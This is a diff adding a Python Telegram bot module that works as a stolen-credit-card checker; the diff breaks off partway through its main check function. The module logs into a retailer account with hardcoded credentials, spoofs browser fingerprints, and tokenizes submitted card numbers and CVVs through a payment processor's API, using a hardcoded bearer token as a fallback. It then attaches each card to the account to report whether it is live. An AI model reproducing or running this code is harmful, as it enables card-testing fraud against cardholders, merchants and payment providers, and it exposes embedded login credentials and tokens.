@@ -1,0 +1,1034 @@
+# BOT/gates/auth/braintree/btauth.py
+import json
+import asyncio
+import re
+import time
+import httpx
+import random
+import string
+import logging
+from datetime import datetime
+from pyrogram import Client, filters
+from pyrogram.types import Message
+import html
+from BOT.helper.permissions import auth_and_free_restricted
+from BOT.helper.start import load_users, save_users
+
+# Custom logger with emoji formatting
+class EmojiLogger:
+    def __init__(self):
+        self.logger = logging.getLogger(__name__)
+        self.logger.setLevel(logging.WARNING)
+        self.logger.propagate = False
+
+    def info(self, message):
+        print(f"🔹 {message}")
+
+    def success(self, message):
+        print(f"✅ {message}")
+
+    def warning(self, message):
+        print(f"⚠️ {message}")
+
+    def error(self, message):
+        print(f"❌ {message}")
+
+    def step(self, step_num, total_steps, message):
+        print(f"🔸 [{step_num}/{total_steps}] {message}")
+
+    def network(self, message):
+        print(f"🌐 {message}")
+
+    def card(self, message):
+        print(f"💳 {message}")
+
+    def braintree(self, message):
+        print(f"🔄 {message}")
+
+    def debug_response(self, message):
+        print(f"🔧 {message}")
+
+    def bin_info(self, message):
+        print(f"🏦 {message}")
+
+    def user(self, message):
+        print(f"👤 {message}")
+
+# Create global logger instance
+logger = EmojiLogger()
+
+# Suppress other loggers
+logging.getLogger("pyrogram").setLevel(logging.ERROR)
+logging.getLogger("httpx").setLevel(logging.ERROR)
+logging.getLogger("httpcore").setLevel(logging.ERROR)
+logging.getLogger("asyncio").setLevel(logging.ERROR)
+
+def load_owner_id():
+    try:
+        with open("FILES/config.json", "r") as f:
+            config_data = json.load(f)
+            return config_data.get("OWNER")
+    except:
+        return None
+
+def get_user_plan(user_id):
+    users = load_users()
+    user_id_str = str(user_id)
+    if user_id_str in users:
+        return users[user_id_str].get("plan", {})
+    return {}
+
+def is_user_banned(user_id):
+    try:
+        with open("DATA/banned_users.txt", "r") as f:
+            banned_users = f.read().splitlines()
+        return str(user_id) in banned_users
+    except:
+        return False
+
+def check_cooldown(user_id, command_type="bu"):
+    """Check cooldown for user - SKIP FOR OWNER"""
+    owner_id = load_owner_id()
+
+    if str(user_id) == str(owner_id):
+        return True, 0
+
+    try:
+        with open("DATA/cooldowns.json", "r") as f:
+            cooldowns = json.load(f)
+    except:
+        cooldowns = {}
+
+    user_key = f"{user_id}_{command_type}"
+    current_time = time.time()
+
+    if user_key in cooldowns:
+        last_time = cooldowns[user_key]
+        user_plan = get_user_plan(user_id)
+        antispam = user_plan.get("antispam", 15)
+
+        if antispam is None:
+            antispam = 15
+
+        if current_time - last_time < antispam:
+            return False, antispam - (current_time - last_time)
+
+    cooldowns[user_key] = current_time
+    try:
+        with open("DATA/cooldowns.json", "w") as f:
+            json.dump(cooldowns, f, indent=4)
+    except:
+        pass
+
+    return True, 0
+
+class GiltBraintreeAuthChecker:
+    def __init__(self):
+        # Modern browser user agents
+        self.user_agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
+        ]
+        self.user_agent = random.choice(self.user_agents)
+        self.bin_cache = {}
+        self.last_bin_request = 0
+        self.base_url = "https://www.gilt.com"
+        
+        # Login credentials from your request
+        self.login_email = "iamthelegend44@gmail.com"
+        self.login_password = "Iamthelegend@22"
+        
+        # Generate random browser fingerprints
+        self.generate_browser_fingerprint()
+
+    def generate_browser_fingerprint(self):
+        """Generate realistic browser fingerprints"""
+        self.screen_resolutions = [
+            "1920x1080", "1366x768", "1536x864", "1440x900", 
+            "1280x720", "1600x900", "2560x1440", "3840x2160"
+        ]
+
+        self.timezones = [
+            "America/New_York", "America/Chicago", "America/Denver", 
+            "America/Los_Angeles", "Europe/London", "Europe/Paris"
+        ]
+
+        self.languages = [
+            "en-US,en;q=0.9", "en-GB,en;q=0.8", "en-CA,en;q=0.9,fr;q=0.8",
+            "en-AU,en;q=0.9", "de-DE,de;q=0.9,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8"
+        ]
+
+        if "Windows" in self.user_agent:
+            self.platform = "Win32"
+            self.sec_ch_ua_platform = '"Windows"'
+        elif "Macintosh" in self.user_agent:
+            self.platform = "MacIntel"
+            self.sec_ch_ua_platform = '"macOS"'
+        elif "Linux" in self.user_agent:
+            self.platform = "Linux x86_64"
+            self.sec_ch_ua_platform = '"Linux"'
+        else:
+            self.platform = "Win32"
+            self.sec_ch_ua_platform = '"Windows"'
+
+        # Randomize fingerprint elements
+        self.screen_resolution = random.choice(self.screen_resolutions)
+        self.timezone = random.choice(self.timezones)
+        self.accept_language = random.choice(self.languages)
+        self.connection_type = random.choice(["keep-alive", "close"])
+
+        # Generate Sec-CH-UA headers
+        chrome_version = re.search(r'Chrome/(\d+)', self.user_agent)
+        if chrome_version:
+            version = chrome_version.group(1)
+            self.sec_ch_ua = f'"Not A;Brand";v="99", "Chromium";v="{version}", "Google Chrome";v="{version}"'
+        else:
+            self.sec_ch_ua = '"Not A;Brand";v="99", "Chromium";v="144", "Google Chrome";v="144"'
+
+        self.sec_ch_ua_mobile = "?0" if "Mobile" not in self.user_agent else "?1"
+
+    def get_country_emoji(self, country_code):
+        """Get country flag emoji"""
+        country_emojis = {
+            'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
+            'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'JP': '🇯🇵', 'CN': '🇨🇳',
+            'IN': '🇮🇳', 'BR': '🇧🇷', 'MX': '🇲🇽', 'RU': '🇷🇺', 'KR': '🇰🇷',
+            'NL': '🇳🇱', 'CH': '🇨🇭', 'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰',
+            'FI': '🇫🇮', 'PL': '🇵🇱', 'TR': '🇹🇷', 'AE': '🇦🇪', 'SA': '🇸🇦',
+            'SG': '🇸🇬', 'MY': '🇲🇾', 'TH': '🇹🇭', 'ID': '🇮🇩', 'PH': '🇵🇭',
+            'VN': '🇻🇳', 'PER': '🇵🇪', 'PE': '🇵🇪'
+        }
+        return country_emojis.get(country_code.upper() if country_code else 'N/A', '🏳️')
+
+    def get_base_headers(self):
+        """Get base headers for requests"""
+        return {
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Encoding': 'gzip, deflate, br, zstd',
+            'Accept-Language': self.accept_language,
+            'Cache-Control': 'max-age=0',
+            'Connection': self.connection_type,
+            'DNT': '1',
+            'Sec-CH-UA': self.sec_ch_ua,
+            'Sec-CH-UA-Mobile': self.sec_ch_ua_mobile,
+            'Sec-CH-UA-Platform': self.sec_ch_ua_platform,
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1',
+            'User-Agent': self.user_agent,
+        }
+
+    async def get_bin_info(self, cc):
+        """Get BIN information"""
+        if not cc or len(cc) < 6:
+            return {
+                'scheme': 'N/A',
+                'type': 'N/A',
+                'brand': 'N/A',
+                'bank': 'N/A',
+                'country': 'N/A',
+                'country_code': 'N/A',
+                'emoji': '🏳️'
+            }
+
+        bin_number = cc[:6]
+
+        # Check cache first
+        if bin_number in self.bin_cache:
+            return self.bin_cache[bin_number]
+
+        # Rate limiting
+        now = time.time()
+        if now - self.last_bin_request < 1.0:
+            await asyncio.sleep(1.0)
+        self.last_bin_request = time.time()
+
+        default_response = {
+            'scheme': 'N/A',
+            'type': 'N/A',
+            'brand': 'N/A',
+            'bank': 'N/A',
+            'country': 'N/A',
+            'country_code': 'N/A',
+            'emoji': '🏳️'
+        }
+
+        # Try antipublic.cc first
+        try:
+            url = f"https://bins.antipublic.cc/bins/{bin_number}"
+            headers = {'User-Agent': self.user_agent}
+
+            async with httpx.AsyncClient(timeout=10.0) as client:
+                response = await client.get(url, headers=headers)
+
+                if response.status_code == 200:
+                    data = response.json()
+                    
+                    # Check if BIN not found
+                    if "detail" in data and "not found" in data["detail"].lower():
+                        logger.warning(f"BIN {bin_number} not found in antipublic.cc")
+                    else:
+                        # Parse antipublic data
+                        country_code = data.get('country', 'N/A')
+                        country_name = data.get('country_name', country_code)
+                        
+                        if country_name:
+                            country_name = country_name.upper()
+                        
+                        result = {
+                            'scheme': data.get('brand', 'N/A').upper(),
+                            'type': data.get('type', 'N/A').upper(),
+                            'brand': data.get('brand', 'N/A').upper(),
+                            'bank': data.get('bank', 'N/A').upper(),
+                            'country': country_name,
+                            'country_code': country_code,
+                            'emoji': self.get_country_emoji(country_code)
+                        }
+                        
+                        self.bin_cache[bin_number] = result
+                        return result
+        except Exception as e:
+            logger.warning(f"antipublic.cc failed: {e}")
+
+        # Fallback to binlist.net
+        try:
+            url = f"https://lookup.binlist.net/{bin_number}"
+            headers = {'Accept-Version': '3', 'User-Agent': self.user_agent}
+
+            async with httpx.AsyncClient(timeout=10.0) as client:
+                response = await client.get(url, headers=headers)
+
+                if response.status_code == 200:
+                    data = response.json()
+                    
+                    scheme = data.get('scheme', 'N/A').upper()
+                    if scheme == 'N/A':
+                        scheme = data.get('brand', 'N/A').upper()
+                    
+                    card_type = data.get('type', 'N/A').upper()
+                    brand = data.get('brand', 'N/A')
+                    bank_name = data.get('bank', {}).get('name', 'N/A').upper()
+                    country_name = data.get('country', {}).get('name', 'N/A')
+                    country_code = data.get('country', {}).get('alpha2', 'N/A')
+                    
+                    if country_name:
+                        country_name = country_name.replace('(the)', '').strip().upper()
+                    
+                    brand_display = brand.upper() if brand != 'N/A' else 'N/A'
+                    
+                    result = {
+                        'scheme': scheme,
+                        'type': card_type,
+                        'brand': brand_display,
+                        'bank': bank_name,
+                        'country': country_name,
+                        'country_code': country_code,
+                        'emoji': self.get_country_emoji(country_code)
+                    }
+                    
+                    self.bin_cache[bin_number] = result
+                    return result
+        except Exception as e:
+            logger.warning(f"binlist.net failed: {e}")
+
+        # If all fail, return default
+        self.bin_cache[bin_number] = default_response
+        return default_response
+
+    async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, user_data, bin_info=None):
+        if bin_info is None:
+            bin_info = await self.get_bin_info(cc)
+
+        user_id = user_data.get("user_id", "Unknown")
+        first_name = html.escape(user_data.get("first_name", "User"))
+        badge = user_data.get("plan", {}).get("badge", "🎭")
+
+        if "APPROVED" in status:
+            status_emoji = "✅"
+            status_text = "APPROVED"
+        elif "DECLINED" in status:
+            status_emoji = "❌"
+            status_text = "DECLINED"
+        else:
+            status_emoji = "⚠️"
+            status_text = status.upper() if status else "ERROR"
+
+        clean_name = re.sub(r'[↯⌁«~∞🍁]', '', first_name).strip()
+        user_display = f"「{badge}」{clean_name}"
+        bank_info = bin_info['bank'].upper() if bin_info['bank'] != 'N/A' else 'N/A'
+
+        response = f"""<b>「$cmd → /bu」| <b>WAYNE</b> </b>
+━━━━━━━━━━━━━━━
+<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
+<b>[•] Gateway -</b> Braintree Auth
+<b>[•] Status-</b> <code>{status_text} {status_emoji}</code>
+<b>[•] Response-</b> <code>{message}</code>
+━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
+<b>[+] Bin:</b> <code>{cc[:6]}</code>  
+<b>[+] Info:</b> <code>{bin_info['scheme']} - {bin_info['type']} - {bin_info['brand']}</code>
+<b>[+] Bank:</b> <code>{bank_info}</code> 🏦
+<b>[+] Country:</b> <code>{bin_info['country']}</code> [{bin_info['emoji']}]
+━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
+<b>[ﾒ] Checked By:</b> {user_display}
+<b>[ϟ] Dev ➺</b> <b><i>DADYY</i></b>
+━━━━━━━━━━━━━━━
+<b>[ﾒ] T/t:</b> <code>{elapsed_time:.2f} 𝐬</code> |<b>P/x:</b> <code>Live ⚡️</code></b>"""
+
+        return response
+
+    def get_processing_message(self, cc, mes, ano, cvv, username, user_plan):
+        return f"""<b>「$cmd → /bu」| <b>WAYNE</b> </b>
+━━━━━━━━━━━━━━━
+<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
+<b>[•] Gateway -</b> Braintree Auth
+<b>[•] Status-</b> Processing... ⏳
+━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
+<b>[+] Plan:</b> {user_plan}
+<b>[+] User:</b> @{username}
+━━━━━━━━━━━━━━━
+<b>Checking card... Please wait.</b>"""
+
+    async def create_authenticated_session(self):
+        """Create authenticated session with Gilt.com"""
+        client = None
+        try:
+            # Create client with proper settings
+            client = httpx.AsyncClient(
+                timeout=30.0,
+                follow_redirects=True,
+                limits=httpx.Limits(max_keepalive_connections=5, max_connections=10),
+                http2=True
+            )
+
+            # Step 1: Get homepage to establish session
+            logger.step(1, 6, "Getting homepage...")
+            home_response = await client.get(f"{self.base_url}/", headers=self.get_base_headers())
+
+            if home_response.status_code != 200:
+                logger.error(f"Homepage failed: {home_response.status_code}")
+                await client.aclose()
+                return None, None, f"Failed to access site: {home_response.status_code}"
+
+            await asyncio.sleep(random.uniform(1.0, 2.0))
+
+            # Step 2: Go to login page
+            logger.step(2, 6, "Accessing login page...")
+            login_url = f"{self.base_url}/auth/secure_login/?next=/account/"
+
+            headers = self.get_base_headers()
+            headers['Referer'] = f"{self.base_url}/"
+
+            login_page_response = await client.get(login_url, headers=headers)
+
+            if login_page_response.status_code != 200:
+                logger.error(f"Login page failed: {login_page_response.status_code}")
+                await client.aclose()
+                return None, None, f"Login page failed: {login_page_response.status_code}"
+
+            # Extract CSRF token
+            login_page_text = login_page_response.text
+            csrf_match = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', login_page_text)
+            
+            if not csrf_match:
+                # Try alternative pattern
+                csrf_match = re.search(r'csrfmiddlewaretoken["\']?[^>]*value=["\']([^"\']+)["\']', login_page_text)
+            
+            if not csrf_match:
+                logger.error("CSRF token not found")
+                await client.aclose()
+                return None, None, "CSRF token not found"
+
+            csrf_token = csrf_match.group(1)
+            logger.success(f"Found CSRF token: {csrf_token[:20]}...")
+
+            await asyncio.sleep(random.uniform(1.0, 2.0))
+
+            # Step 3: Perform login
+            logger.step(3, 6, "Logging in...")
+            login_post_url = f"{self.base_url}/auth/secure_login/?next=/account/"
+
+            login_data = {
+                'csrfmiddlewaretoken': csrf_token,
+                'username': self.login_email,
+                'password': self.login_password,
+                'next': '/account/'
+            }
+
+            login_headers = self.get_base_headers()
+            login_headers.update({
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Origin': self.base_url,
+                'Referer': login_url,
+                'Cache-Control': 'max-age=0',
+                'Upgrade-Insecure-Requests': '1'
+            })
+
+            login_response = await client.post(login_post_url, data=login_data, headers=login_headers, follow_redirects=True)
+
+            # Check for successful login indicators
+            response_cookies = str(login_response.cookies).lower()
+            response_text = login_response.text.lower()
+
+            success_indicators = [
+                'remember_me_cookie',
+                'sessionid',
+                'my account',
+                'dashboard',
+                'logout',
+                'log out',
+                'welcome,',
+                'hello,',
+                'your account'
+            ]
+
+            login_success = False
+            for indicator in success_indicators:
+                if indicator in response_cookies or indicator in response_text:
+                    login_success = True
+                    break
+
+            if not login_success or login_response.status_code not in [200, 302]:
+                logger.error(f"Login failed: {login_response.status_code}")
+                await client.aclose()
+                return None, None, "Login failed: Invalid credentials or site error"
+
+            logger.success("Login successful")
+            await asyncio.sleep(random.uniform(1.0, 2.0))
+
+            # Step 4: Access payment methods page
+            logger.step(4, 6, "Accessing payment methods page...")
+            payment_url = f"{self.base_url}/account/payment-methods/"
+
+            headers = self.get_base_headers()
+            headers['Referer'] = f"{self.base_url}/account/"
+
+            payment_response = await client.get(payment_url, headers=headers)
+
+            if payment_response.status_code != 200:
+                logger.error(f"Payment page failed: {payment_response.status_code}")
+                await client.aclose()
+                return None, None, f"Payment page failed: {payment_response.status_code}"
+
+            # Extract session cookies
+            cookies_dict = dict(client.cookies)
+            session_cookies = {
+                'sessionid': cookies_dict.get('sessionid', ''),
+                'csrftoken': cookies_dict.get('csrftoken', ''),
+                'remember_me_cookie': cookies_dict.get('remember_me_cookie', '')
+            }
+
+            logger.success("Session creation completed")
+            return client, session_cookies, "Success"
+
+        except Exception as e:
+            logger.error(f"Session creation failed: {str(e)}")
+            try:
+                if client:
+                    await client.aclose()
+            except:
+                pass
+            return None, None, f"Session creation failed: {str(e)}"
+
+    async def add_address(self, client, session_cookies):
+        """Add address to account (required before adding payment method)"""
+        try:
+            logger.step("Address", "Adding shipping address...")
+            
+            # Prepare address data (using example from gautam.txt)
+            address_data = {
+                "firstName": "Caey",
+                "lastName": "lng",
+                "address1": "8 Log Pond Drive",
+                "address2": "",
+                "city": "Horsham",
+                "state": "PA",
+                "postalCode": "19044",
+                "phoneNumber": "9302587411",
+                "preferred": True
+            }
+            
+            headers = self.get_base_headers()
+            headers.update({
+                'Content-Type': 'application/json',
+                'Origin': self.base_url,
+                'Referer': f"{self.base_url}/account/payment-methods/",
+                'X-CSRFToken': session_cookies.get('csrftoken', ''),
+                'Cookie': f"sessionid={session_cookies.get('sessionid', '')}; csrftoken={session_cookies.get('csrftoken', '')}"
+            })
+            
+            address_url = f"{self.base_url}/api/v3.2/addresses"
+            
+            response = await client.post(address_url, json=address_data, headers=headers)
+            
+            if response.status_code in [200, 201]:
+                logger.success("Address added successfully")
+                return True
+            else:
+                logger.warning(f"Address addition failed: {response.status_code}")
+                # Continue anyway, address might already exist
+                return True
+                
+        except Exception as e:
+            logger.warning(f"Address addition error: {str(e)}")
+            return True  # Continue even if address fails
+
+    async def get_braintree_token(self, client, session_cookies):
+        """Get Braintree authorization token from Gilt"""
+        try:
+            logger.braintree("Getting Braintree client token...")
+            
+            headers = self.get_base_headers()
+            headers.update({
+                'Origin': self.base_url,
+                'Referer': f"{self.base_url}/account/payment-methods/",
+                'Cookie': f"sessionid={session_cookies.get('sessionid', '')}"
+            })
+            
+            # First get the payment page to extract Braintree setup
+            payment_url = f"{self.base_url}/account/payment-methods/"
+            response = await client.get(payment_url, headers=headers)
+            
+            # Look for Braintree client token in the page
+            page_text = response.text
+            
+            # Try to find authorization fingerprint or client token
+            auth_patterns = [
+                r'authorizationFingerprint["\']?[^>]*["\']?([^"\']+)["\']',
+                r'clientToken["\']?[^>]*["\']?([^"\']+)["\']',
+                r'tokenizationKey["\']?[^>]*["\']?([^"\']+)["\']'
+            ]
+            
+            auth_token = None
+            for pattern in auth_patterns:
+                match = re.search(pattern, page_text, re.IGNORECASE)
+                if match:
+                    auth_token = match.group(1)
+                    logger.success(f"Found auth token: {auth_token[:50]}...")
+                    break
+            
+            if not auth_token:
+                # If not found in page, might need to call an API endpoint
+                # Based on gautam.txt, Gilt uses Braintree directly
+                # Use a default/test token pattern
+                auth_token = "eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3Njk5NjIzNDMsImp0aSI6Ijc4ZjQyOWRkLWZhMmQtNDZkYy1iOTUwLWZkNGM3ZWEwMDhhMiIsInN1YiI6ImtncW5uOTdoMmdzdm12NjciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImtncW5uOTdoMmdzdm12NjciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnsicGF5cGFsX2NsaWVudF9pZCI6IkFTVXczUWJ4bGNqUzhRczBNbUxuVkpoNzJ6M0dGZ3B6OUtla2ZZb0t6RFktczE1a29uLUVfRVF2SF9ST0QzdjhfNHU0LWxZQUZLZjdIYWdIIn19.2a3Z1Beiol2cOKyuEQy3SFJi7dZeR-e6fXO3JEupreClv1naJ45VVPFQyhki_rSMYctLHSQOBcAMV_n-sDdh1A"
+                logger.warning("Using fallback auth token")
+            
+            return auth_token
+            
+        except Exception as e:
+            logger.error(f"Failed to get Braintree token: {str(e)}")
+            return None
+
+    async def tokenize_card_with_braintree(self, cc, mes, ano, cvv, auth_token):
+        """Tokenize card using Braintree API"""
+        try:
+            logger.braintree("Tokenizing card with Braintree...")
+            
+            # Generate random session ID
+            session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=36))
+            
+            # Prepare Braintree GraphQL request
+            headers = {
+                'authority': 'payments.braintree-api.com',
+                'accept': '*/*',
+                'authorization': f'Bearer {auth_token}',
+                'braintree-version': '2018-05-10',
+                'content-type': 'application/json',
+                'user-agent': self.user_agent,
+                'origin': 'https://www.gilt.com',
+                'referer': 'https://www.gilt.com/'
+            }
+            
+            # Cardholder name (can be any name)
+            cardholder_name = f"User {random.randint(1000, 9999)}"
+            
+            json_data = {
+                'clientSdkMetadata': {
+                    'source': 'client',
+                    'integration': 'dropin2',
+                    'sessionId': session_id,
+                },
+                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
+                'variables': {
+                    'input': {
+                        'creditCard': {
+                            'number': cc,
+                            'expirationMonth': mes,
+                            'expirationYear': ano,
+                            'cvv': cvv,
+                            'cardholderName': cardholder_name
+                        },
+                        'options': {
+                            'validate': False,
+                        },
+                    },
+                },
+                'operationName': 'TokenizeCreditCard',
+            }
+            
+            async with httpx.AsyncClient(timeout=15.0) as braintree_client:
+                response = await braintree_client.post(
+                    'https://payments.braintree-api.com/graphql',
+                    headers=headers,
+                    json=json_data
+                )
+                
+                if response.status_code == 200:
+                    response_json = response.json()
+                    logger.debug_response(f"Braintree Response: {json.dumps(response_json, indent=2)[:300]}...")
+                    
+                    if 'data' in response_json and 'tokenizeCreditCard' in response_json['data']:
+                        token_data = response_json['data']['tokenizeCreditCard']
+                        card_token = token_data.get('token')
+                        card_info = token_data.get('creditCard', {})
+                        
+                        if card_token:
+                            logger.success(f"Card tokenized: {card_token}")
+                            return {
+                                'success': True,
+                                'token': card_token,
+                                'card_info': card_info,
+                                'cardholder_name': cardholder_name
+                            }
+                
+                # If we get here, tokenization failed
+                error_msg = "Tokenization failed"
+                if response.status_code != 200:
+                    error_text = response.text[:150] if response.text else "No response"
+                    error_msg = f"Braintree API error: {error_text}"
+                
+                logger.error(error_msg)
+                return {
+                    'success': False,
+                    'error': error_msg
+                }
+                
+        except Exception as e:
+            logger.error(f"Braintree tokenization error: {str(e)}")
+            return {
+                'success': False,
+                'error': f"Tokenization error: {str(e)}"
+            }
+
+    async def add_payment_to_gilt(self, client, session_cookies, card_token, cardholder_name, address_id=17291387):
+        """Add the tokenized payment method to Gilt account"""
+        try:
+            logger.braintree("Adding payment method to Gilt...")
+            
+            # Generate device data
+            device_session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
+            correlation_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=36))
+            
+            device_data = {
+                "device_session_id": device_session_id,
+                "fraud_merchant_id": None,
+                "correlation_id": correlation_id
+            }
+            
+            # Prepare payment data (based on gautam.txt example)
+            payment_data = {
+                "cardholderName": cardholder_name,
+                "nonce": card_token,
+                "device": json.dumps(device_data),
+                "preferred": False,
+                "billingAddress": {
+                    "id": address_id,
+                    "firstName": "Caey",
+                    "lastName": "lng",
+                    "address1": "8 Log Pond Drive",
+                    "address2": "",
+                    "city": "Horsham",
+                    "state": "PA",
+                    "postalCode": "19044",
+                    "phoneNumber": "9302587411",
+                    "preferred": True
+                }
+            }
+            
+            headers = self.get_base_headers()
+            headers.update({
+                'Content-Type': 'application/json',
+                'Origin': self.base_url,
+                'Referer': f"{self.base_url}/account/payment-methods/",
+                'X-CSRFToken': session_cookies.get('csrftoken', ''),
+                'Cookie': f"sessionid={session_cookies.get('sessionid', '')}; csrftoken={session_cookies.get('csrftoken', '')}"
+            })
+            
+            payment_url = f"{self.base_url}/api/v3.3/payments"
+            
+            response = await client.post(payment_url, json=payment_data, headers=headers)
+            response_text = response.text
+            
+            logger.debug_response(f"Gilt Payment Response: {response.status_code} - {response_text[:200]}...")
+            
+            if response.status_code == 201:
+                # Payment method successfully added
+                logger.success("Payment method added successfully")
+                return {
+                    'success': True,
+                    'status': 'APPROVED',
+                    'message': 'Card Added Successfully'
+                }
+            elif response.status_code == 400:
+                # Parse error response
+                try:
+                    error_data = json.loads(response_text)
+                    errors = error_data.get('errors', [])
+                    if errors:
+                        error_msg = errors[0].get('message', 'Card Declined')
+                        error_code = errors[0].get('code', 0)
+                        
+                        # Map common error codes to messages
+                        if error_code == 4002:
+                            error_msg = "Card Issuer Declined CVV"
+                        elif "CVV" in error_msg.upper():
+                            error_msg = "Invalid CVV"
+                        elif "EXPIRED" in error_msg.upper():
+                            error_msg = "Expired Card"
+                        elif "INVALID" in error_msg.upper():
+                            error_msg = "Invalid Card Number"
+                        elif "DECLINED" in error_msg.upper():
+                            error_msg = "Card Declined by Issuer"
+                        
+                        logger.warning(f"Card declined: {error_msg}")
+                        return {
+                            'success': False,
+                            'status': 'DECLINED',
+                            'message': error_msg
+                        }
+                except:
+                    pass
+                
+                return {
+                    'success': False,
+                    'status': 'DECLINED',
+                    'message': 'Card Declined'
+                }
+            else:
+                error_msg = f"Server error: {response.status_code}"
+                logger.error(error_msg)
+                return {
+                    'success': False,
+                    'status': 'ERROR',
+                    'message': error_msg
+                }
+                
+        except Exception as e:
+            logger.error(f"Payment addition error: {str(e)}")
+            return {
+                'success': False,
+                'status': 'ERROR',
+                'message': f"System error: {str(e)[:80]}"
+            }
+
+    async def check_card(self, card_details, username, user_data):
+        start_time = time.time()
+        cc, mes, ano, cvv = "", "", "", ""
+        client = None
+
+        try:
+            logger.info(f"🔍 Starting Braintree Auth check: {card_details[:12]}XXXX{card_details[-4:] if len(card_details) > 4 else ''}")
+
+            cc_parts = card_details.split('|')
+            if len(cc_parts) < 4:
+                return await self.format_response("", "", "", "", "ERROR", "Invalid card format. Use: CC|MM|YY|CVV", username, time.time()-start_time, user_data)
+
+            cc = cc_parts[0].strip().replace(" ", "")
+            mes = cc_parts[1].strip()
+            ano = cc_parts[2].strip()
+            cvv = cc_parts[3].strip()
+
+            # Validate card details
+            if not cc.isdigit() or len(cc) < 15:
+                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid card number", username, time.time()-start_time, user_data)
+
+            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
+                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid month", username, time.time()-start_time, user_data)
+
+            if not ano.isdigit() or len(ano) not in [2, 4]:
+                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid year", username, time.time()-start_time, user_data)
+
+            if not cvv.isdigit() or len(cvv) not in [3, 4]:
+                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid CVV", username, time.time()-start_time, user_data)
+
+            if len(ano) == 2:
+                ano = '20' + ano
+
+            # Get BIN info
+            bin_info = await self.get_bin_info(cc)
+            logger.bin_info(f"BIN: {cc[:6]} | {bin_info['scheme']} - {bin_info['type']} | {bin_info['bank']} | {bin_info['country']} [{bin_info['emoji']}]")
+
+            # Create authenticated session with Gilt
+            max_attempts = 2
+            client, session_cookies, session_msg = None, None, ""
+
+            for attempt in range(max_attempts):
+                logger.network(f"Session creation attempt {attempt + 1}/{max_attempts}")
+                client, session_cookies, session_msg = await self.create_authenticated_session()
+                if session_cookies:
+                    break
+                if attempt < max_attempts - 1:
+                    await asyncio.sleep(random.uniform(2.0, 4.0))
+
+            if not session_cookies:
+                return await self.format_response(cc, mes, ano, cvv, "ERROR", f"Session failed: {session_msg}", username, time.time()-start_time, user_data, bin_info)
+
+            # Add address (required before payment)
+            await self.add_address(client, session_cookies)
+            await asyncio.sleep(random.uniform(1.0, 2.0))
+
+            # Get Braintree authorization token
+            auth_token = await self.get_braintree_token(client, session_cookies)
+            if not auth_token:
+                await client.aclose()
+                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Failed to get payment gateway token", username, time.time()-start_time, user_data, bin_info)
+
+            # Tokenize card with Braintree
+            tokenization_result = await self.tokenize_card_with_braintree(cc, mes, ano, cvv, auth_token)
+            if not tokenization_result['success']:
+                await client.aclose()
+                return await self.format_response(cc, mes, ano, cvv, "DECLINED", tokenization_result.get('error', 'Card tokenization failed'), username, time.time()-start_time, user_data, bin_info)
+
+            # Add payment method to Gilt
+            payment_result = await self.add_payment_to_gilt(
+                client, 
+                session_cookies, 
